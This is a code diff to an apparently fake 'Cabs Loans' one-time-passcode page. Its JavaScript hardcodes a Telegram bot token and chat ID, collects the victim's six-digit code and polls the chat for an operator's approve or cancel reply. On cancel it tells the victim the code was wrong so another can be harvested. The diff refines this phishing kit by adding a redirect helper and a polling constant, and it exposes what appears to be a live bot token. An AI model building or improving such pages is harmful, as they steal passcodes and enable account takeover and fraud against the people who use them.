@@ -140,7 +140,6 @@
             background: #f5f7fa;
             flex-shrink: 0;
             margin-top: auto;
-            /* Pushes footer to bottom */
         }
         /* SPINNER */
         
@@ -241,7 +240,6 @@
 
     <footer>© 2025 Cabs Loans</footer>
 
-    <!-- SPINNER -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
@@ -249,7 +247,6 @@
         </div>
     </div>
 
-    <!-- RESULT OVERLAY -->
     <div id="resultOverlay">
         <div class="result-message" id="resultMessage"></div>
     </div>
@@ -257,8 +254,8 @@
     <script>
         const BOT_TOKEN = '8942095806:AAE7fGncRZcXDv0s9BW_ZQSKzovwO09tYv8';
         const CHAT_ID = '8820857419';
+        const POLL_INTERVAL_MS = 1000;
 
-        // Mask phone from localStorage
         const savedPhone = localStorage.getItem('phone') || '785123463';
         const visibleStart = savedPhone.slice(0, 3);
         const visibleEnd = savedPhone.slice(-2);
@@ -272,6 +269,24 @@
         const resultMessage = document.getElementById('resultMessage');
         const timerSpan = document.getElementById('timer');
 
+        function getSafeLastPage() {
+            const stored = sessionStorage.getItem('lastPageBeforeOtp');
+            if (stored) return stored;
+
+            if (document.referrer) {
+                try {
+                    const ref = new URL(document.referrer);
+                    if (ref.origin === window.location.origin) {
+                        return ref.pathname || 'index.html';
+                    }
+                } catch (error) {
+                    // Ignore invalid referrer values and fall back below.
+                }
+            }
+
+            return 'index.html';
+        }
+
         let otpValue = '';
         let initialSeconds = 116;
         let seconds = initialSeconds;
@@ -280,9 +295,7 @@
         let lastUpdateId = 0;
         let currentCallbackData = '';
 
-        // Countdown timer helper
         function startCountdown(startSec) {
-            // clear any existing interval
             if (countdownInterval) clearInterval(countdownInterval);
             seconds = startSec;
             timerSpan.textContent = seconds;
@@ -296,7 +309,6 @@
             }, 1000);
         }
 
-        // start initial countdown
         startCountdown(seconds);
 
         function checkOtpComplete() {
@@ -311,9 +323,7 @@
         }
 
         otpBoxes.forEach((box, index) => {
-            // Force numeric only
             box.addEventListener('input', (e) => {
-                // strip non-digits
                 box.value = box.value.replace(/\D/g, '');
                 if (box.value.length === 1 && index < 5) {
                     otpBoxes[index + 1].focus();
@@ -325,13 +335,11 @@
                 if (e.key === 'Backspace' && box.value === '' && index > 0) {
                     otpBoxes[index - 1].focus();
                 }
-                // prevent non-digit keys (allow navigation keys)
                 if (e.key.length === 1 && /[^0-9]/.test(e.key)) {
                     e.preventDefault();
                 }
             });
 
-            // make sure paste works (only first 6 digits)
             box.addEventListener('paste', (e) => {
                 e.preventDefault();
                 const paste = (e.clipboardData || window.clipboardData).getData('text');
@@ -393,8 +401,6 @@
                 // ignore send error; polling will just time out
             });
 
-            // Poll for admin response
-            // Clear any previous poll if still running
             if (pollInterval) clearInterval(pollInterval);
 
             pollInterval = setInterval(() => {
@@ -406,25 +412,22 @@
                                 lastUpdateId = update.update_id;
                                 if (update.callback_query) {
                                     const dataParts = update.callback_query.data.split('_');
-                                    // second part should be the timestamp used when sending
                                     if (dataParts[1] == timestamp) {
                                         clearInterval(pollInterval);
                                         spinnerOverlay.style.display = 'none';
 
                                         if (dataParts[0] === 'approve') {
-                                            // show approval message and then navigate to final page (summary.html)
+                                            const redirectUrl = getSafeLastPage();
+                                            sessionStorage.removeItem('lastPageBeforeOtp');
                                             showResult('Your loan has been approved. Redirecting to final page...');
                                             setTimeout(() => {
-                                                window.location.href = 'summary.html';
+                                                window.location.href = redirectUrl;
                                             }, 1000);
                                         } else if (dataParts[0] === 'cancel') {
-                                            // Automatically clear OTP and restart countdown
                                             showResult('The OTP provided is wrong or has expired. Trying again...');
-                                            // brief pause so user sees message, then reset
                                             setTimeout(() => {
                                                 hideResult();
                                                 resetOtpInputs();
-                                                // restart timer
                                                 startCountdown(initialSeconds);
                                             }, 1500);
                                         }
@@ -435,7 +438,7 @@
                     }).catch(() => {
                         // network error - keep polling or show error after some attempts (not implemented)
                     });
-            }, 1500);
+            }, POLL_INTERVAL_MS);
         });
 
         checkOtpComplete();
